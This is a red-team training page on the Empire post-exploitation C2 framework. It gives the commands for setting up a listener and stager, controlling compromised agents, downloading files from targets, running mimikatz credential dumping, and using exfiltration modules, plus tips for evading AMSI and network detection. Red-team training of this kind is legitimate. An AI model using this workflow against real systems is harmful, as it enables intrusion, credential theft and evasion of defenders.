---
layout: training-page
title: "Empire C2 — Red Team Academy"
module: "C2 Frameworks"
tags:
  - empire
  - starkiller
  - sharpire
  - powershell
  - python
  - c2
  - bc-security
page_key: "c2-empire"
render_with_liquid: false
---

# Empire — Post-Exploitation C2 Framework

Empire started life as the "post-exploitation PowerShell agent" released in 2015 and was retired in 2019 before BC-SECURITY revived it. Empire 5.x is a Python 3 teamserver with a REST API, an interactive client, a Vue-based GUI (Starkiller), and five agent languages: PowerShell, Python 3, IronPython 3, C# (Sharpire), and Go. It speaks a catalog of **400+ modules** spanning credential dumping, lateral movement, privesc, and situational awareness.

## Installation

```
# Clone with submodules (Starkiller ships as a submodule in Empire 5):
git clone --recursive https://github.com/BC-SECURITY/Empire.git
cd Empire

# Check out the latest tagged release (avoid bleeding-edge main branch on real engagements):
./setup/checkout-latest-tag.sh

# Install dependencies (apt + pipx/poetry):
./ps-empire install -y

# Alternative: Docker
docker run -it --net host bcsecurity/empire:latest
```

## Starting Services

```
# Empire server (teamserver — listens on :1337 by default for REST API):
./ps-empire server

# Interactive client (same host):
./ps-empire client

# Remote client (connects to a teamserver over REST):
./ps-empire client --ip teamserver.corp.local --port 1337 --username empireadmin --password pass

# Headless API mode (for Starkiller-only / automation):
./ps-empire server --restport 1337
```

Default credentials live in `empire/server/config.yaml` — change `empireadmin:password` immediately after install.

## Core Interactive Workflow

Every Empire engagement follows the same path: listener → stager → agent → modules.

```
# 1. Create a listener (HTTP/HTTPS is the default):
(Empire) > uselistener http
(Empire: uselistener/http) > set Name http-443
(Empire: uselistener/http) > set Port 443
(Empire: uselistener/http) > set Host https://cdn.redteam.ops
(Empire: uselistener/http) > set CertPath /opt/certs/redteam.ops/fullchain.pem
(Empire: uselistener/http) > execute

# 2. Build a stager (PowerShell one-liner):
(Empire) > usestager windows/launcher_bat
(Empire: usestager/windows/launcher_bat) > set Listener http-443
(Empire: usestager/windows/launcher_bat) > set OutFile /tmp/launcher.bat
(Empire: usestager/windows/launcher_bat) > execute

# 3. Agent checks in — list and interact:
(Empire) > agents
(Empire: agents) > interact ABC123XY
(Empire: ABC123XY) > sysinfo
(Empire: ABC123XY) > shell whoami /all
(Empire: ABC123XY) > download C:\Users\target\Desktop\creds.txt
(Empire: ABC123XY) > upload /opt/tools/Rubeus.exe C:\Windows\Temp\r.exe

# 4. Run a module:
(Empire: ABC123XY) > usemodule powershell/credentials/mimikatz/logonpasswords
(Empire: ...) > execute

# Module search and list:
(Empire) > searchmodule kerberoast
(Empire) > listmodules powershell/credentials
```

## Listener Types

| Listener | Channel | When to use |
|----------|---------|-------------|
| `http` | HTTP/HTTPS | Default — pair with a redirector |
| `http_com` | HTTP with COM scripting | Older .NET contexts, edge cases |
| `http_foreign` | Hand off to another C2 | Redirect from Empire to Cobalt Strike / Havoc |
| `http_hop` | HTTP → Hop server → Empire | Extra redirector layer |
| `http_malleable` | Malleable HTTP (Empire flavor) | Blend traffic with named profile |
| `dbx` | Dropbox API | Egress via allowed SaaS |
| `onedrive` | OneDrive API | Egress via allowed SaaS |
| `redirector` | Relay to internal listener | Pivoting inside a network |
| `smb` | SMB named pipe | Peer-to-peer agent only, no outbound |

## Agent Languages

| Agent | Host | Strengths | Gotchas |
|-------|------|-----------|---------|
| **PowerShell** | Windows | Classic Empire, biggest module library | AMSI / Defender / Constrained Language Mode |
| **Python 3** | Linux / macOS | Cross-platform post-ex | Needs Python runtime on target |
| **IronPython 3** | Windows | Bypasses pure-PS detection | Requires shipping IronPython DLLs |
| **C# (Sharpire)** | Windows / .NET | Execute-assembly-friendly, BOF-capable | Smaller module set than PS |
| **Go** | Any | Single static binary, cross-compile | Thinnest module coverage |

## Starkiller — Vue GUI

Starkiller is the web UI. **Since Empire 5.0 / Starkiller 2.0 it ships inside Empire as a submodule** — no separate install, no separate process. It talks to the Empire REST API and gives you:

- Listener / stager / module creation without the interactive prompt
- Agent dashboard with tagging, sleep adjust, bulk module run
- File browser with upload/download
- Chat between operators on the same teamserver
- Graph view of agent relationships (sponsor feature)
- Process browser, module enable/disable, IP filtering (sponsor features)

```
# Access Starkiller after starting Empire:
./ps-empire server
# Then browse:
https://<teamserver-ip>:1337

# Legacy standalone Starkiller 1.x (Empire 4 and earlier, rarely needed):
git clone https://github.com/BC-SECURITY/Starkiller.git
cd Starkiller && yarn install && yarn dev
```

## Sharpire — C# Empire Agent

Sharpire is a C# port of the Empire PowerShell agent, originally released by Alexander Polce Leary (2019). Useful when you need to deliver via `execute-assembly` or when a target is in Constrained Language Mode that breaks the PowerShell agent.

```
# Build:
git clone https://github.com/BC-SECURITY/Sharpire
cd Sharpire
# Open Sharpire.sln in Visual Studio → set Empire listener host + port in Configuration.cs → Release build

# Registration:
#   - Configure the Empire http listener as usual
#   - Sharpire uses the same staging endpoints as the PS agent (/login/process.php etc.)
#   - Run the Sharpire exe on target — it registers as a regular agent in `agents`

# Supported tasks (subset — matches Empire's TASK_CMD_JOB family):
#   tasking, sysinfo, run PS via powershell tag, upload/download,
#   kill, sleep, jitter, shell, module execution
```

Sharpire is the "in testing" project in the BC-SECURITY org — review the code before deploying and expect to patch assembly name (`HavocImplant`-style defaults), string storage, and serialization quirks.

## Module Categories to Know

- `powershell/situational_awareness/*` — host / domain enumeration
- `powershell/credentials/mimikatz/*` — credential extraction
- `powershell/credentials/tokens` — token manipulation
- `powershell/privesc/powerup/*` — PowerUp checks (unquoted paths, weak ACLs, etc.)
- `powershell/lateral_movement/invoke_*` — PsExec, WMI, SCCM, DCOM
- `powershell/persistence/elevated/*` — scheduled tasks, WMI, registry
- `powershell/exfiltration/*` — Dropbox, Pastebin, DNS, email
- `bof/*` — Beacon Object Files executed via Empire's BOF loader
- `csharp/*` — execute-assembly modules (Rubeus, Seatbelt, SharpUp, Certify — already wired up)

## OPSEC Notes

- Default PowerShell agent is AMSI-visible. Combine with the **Obfuscation-Reloaded** techniques (see `evasion/powershell-obfuscation.md`) or use the C#/Go agent for AMSI-hard targets.
- JA3/JARM fingerprints of the default HTTPS listener are publicly catalogued — always front with a redirector (Apache mod_rewrite / Nginx / Caddy) and use a malleable profile.
- `./ps-empire server` listens on 1337 by default — lock this down to a bastion interface or wrap in WireGuard. The REST API accepts token auth that is trivially brute-forceable in default config.
- `agents` default sleep is 5 seconds — change it (`sleep 300 30`) before interacting, otherwise you paint a beacon pattern that's trivial to spot.

## Resources

- Empire — `github.com/BC-SECURITY/Empire`
- Empire wiki / documentation — `bc-security.gitbook.io/empire-wiki/`
- Starkiller — `github.com/BC-SECURITY/Starkiller`
- Sharpire — `github.com/BC-SECURITY/Sharpire` (and original `github.com/0xbadjuju/Sharpire`)
- BC-SECURITY blog — `bc-security.org/blog`
- Empire Malleable C2 Profiles — `github.com/BC-SECURITY/Malleable-C2-Profiles`
- See also: `c2-frameworks/malleable-c2.md`, `evasion/powershell-obfuscation.md`
